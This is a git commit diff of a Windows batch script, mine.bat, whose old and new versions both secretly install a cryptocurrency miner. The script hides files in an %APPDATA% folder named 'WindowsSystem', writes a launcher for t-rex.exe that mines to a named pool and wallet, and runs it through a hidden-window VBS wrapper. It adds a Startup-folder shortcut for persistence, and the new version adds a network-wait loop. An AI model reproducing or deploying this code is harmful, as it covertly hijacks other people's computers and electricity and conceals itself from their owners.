b70ba9659958b8e7ae263ae03235dd66351a57a0
Tejasvi Sharma <134033214+iemtejasvi@users.noreply.github.com>
2025-02-18 12:25:30 +0530

    mine.bat

--- mine.bat
+++ mine.bat
@@ -1,38 +1,28 @@
-@echo off
-setlocal
-
-:: Define script and miner paths
-set "MINER_DIR=%APPDATA%\WindowsSystem"
-set "MINER_SCRIPT=%MINER_DIR%\miner.bat"
-set "VBS_SCRIPT=%MINER_DIR%\run_hidden.vbs"
-set "STARTUP_SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\miner.lnk"
-set "T_REX_EXEC=%MINER_DIR%\t-rex.exe"
-
-:: Create necessary directories
-mkdir "%MINER_DIR%" 2>nul
-
-:: Ensure t-rex.exe exists
-if not exist "%T_REX_EXEC%" (
-    echo ERROR: t-rex.exe not found in "%MINER_DIR%"! > "%MINER_DIR%\miner_error.log"
-    exit /b
-)
-
-:: Write miner script
-(
-    echo @echo off
-    echo cd /d "%MINER_DIR%"  ^&^& start /b "" "%T_REX_EXEC%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe
-) > "%MINER_SCRIPT%"
-
-:: Write VBS script to run miner in hidden mode
-(
-    echo Set WshShell = CreateObject("WScript.Shell")
-    echo WshShell.Run """%MINER_SCRIPT%""", 0, False
-) > "%VBS_SCRIPT%"
-
-:: Create a shortcut in the Startup folder
-powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_SHORTCUT%'); $s.TargetPath='wscript.exe'; $s.Arguments='""%VBS_SCRIPT%""'; $s.Save()"
-
-:: Run miner immediately
-wscript "%VBS_SCRIPT%"
-
+@echo off  
+setlocal  
+  
+:: Define script name and path  
+set "MINER_SCRIPT=%APPDATA%\WindowsSystem\miner.bat"  
+set "VBS_SCRIPT=%APPDATA%\WindowsSystem\run_hidden.vbs"  
+set "STARTUP_SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\miner.lnk"  
+  
+:: Create necessary directories  
+mkdir "%APPDATA%\WindowsSystem" 2>nul  
+  
+:: Write miner script  
+echo @echo off > "%MINER_SCRIPT%"  
+echo :loop >> "%MINER_SCRIPT%"  
+echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop) >> "%MINER_SCRIPT%"  
+echo start /b t-rex.exe -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe >> "%MINER_SCRIPT%"  
+  
+:: Write VBS script to run miner in hidden mode  
+echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_SCRIPT%"  
+echo WshShell.Run """%MINER_SCRIPT%""", 0, False >> "%VBS_SCRIPT%"  
+  
+:: Create a shortcut in the Startup folder  
+powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_SHORTCUT%'); $s.TargetPath='wscript.exe'; $s.Arguments='""%VBS_SCRIPT%""'; $s.Save()"  
+  
+:: Run miner immediately  
+wscript "%VBS_SCRIPT%"  
+  
 exit
